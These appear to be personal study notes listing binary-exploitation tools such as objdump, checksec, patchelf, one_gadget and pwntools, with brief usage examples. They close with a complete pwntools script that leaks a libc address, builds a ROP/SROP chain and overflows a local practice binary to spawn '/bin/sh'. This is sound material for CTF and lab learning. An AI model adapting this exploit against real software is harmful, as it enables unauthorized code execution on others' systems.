1. ldd
	1. display shared libraries loaded by programs
2. objdump
	1. usually used as `objdump -M intel -d ./hello`
	2. This will disassemble it
	3. `-j .plt` to display plt section
3. strings
	1. Used to find strings in binaries
4. strace
	1. Used for tracing syscalls
	2. `-e trace=write` for tracing specific syscalls
5. checksec
	1. Checks the status of different security mitigations
	2. eg. `checksec --file=./hello`
6. libc-database
	1. Useful for finding the libc versions to get their offset
	2. Go to folder libc-database and run `./get kali`
	3. Better to use: https://libc.blukat.me
7. patchelf
	1. Used to change the interpreter of the program
	2. Also set the rpath
	3. example: `patchelf --set-interpreter ./lib/my-ld.so --set-rpath ./lib hello`
8. one_gadget
	1. Useful for finding areas of code for `execve("/bin/sh", NULL, NULL)`
	2. eg: `one_gadget /lib/x86_64-linux-gnu/libc.so.6`
9. Ropper: page 64 of GrayHatHacking
10. pwntools
	1. Used for exploit development
	2. example usage:
	   ```python
		#!/usr/bin/env python3
		from pwn import *
		context.update(arch='amd64', os='linux')
		libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
		p = process("./leak-bof")
		l = log.progress("Stage 1: leak printf and calculate libc's base address")
		p.readuntil("I'm leaking printf: ")
		libc.address = int(p.readline(), 16) - libc.sym['printf']
		l.success(f"0x{libc.address:x}")
		rop = ROP(libc)
		l = log.progress("Stage 2: pop a shell with ROP + SROP payload")
		rop.raw(rop.find_gadget(['pop rax', 'ret']).address)
		rop.raw(constants.SYS_rt_sigreturn)
		rop.raw(rop.syscall.address)
		# build SROP frame
		frame = SigreturnFrame(kernel="amd64", arch="amd64")
		frame.rax = constants.SYS_execve
		frame.rdi = next(libc.search(b"/bin/sh"))
		frame.rsi = 0
		frame.rdx = 0
		frame.rip = rop.syscall.address
		# send stack smash and payload
		p.sendlineafter(": ", b"A"*136 + rop.chain() + bytes(frame))
		l.success('Enjoy!')
		p.interactive()
```
	3. This is why you used in ret2systems demo